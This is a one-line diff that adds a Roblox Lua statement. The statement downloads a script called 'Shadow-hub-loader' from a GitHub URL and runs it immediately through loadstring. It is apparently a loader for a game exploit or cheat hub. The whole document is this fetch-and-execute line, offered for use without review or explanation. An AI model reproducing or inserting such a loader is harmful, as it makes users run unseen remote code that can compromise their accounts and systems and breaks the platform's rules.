@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/aleksmago1/shadowhub/refs/heads/main/Shadow-hub-loader"))()
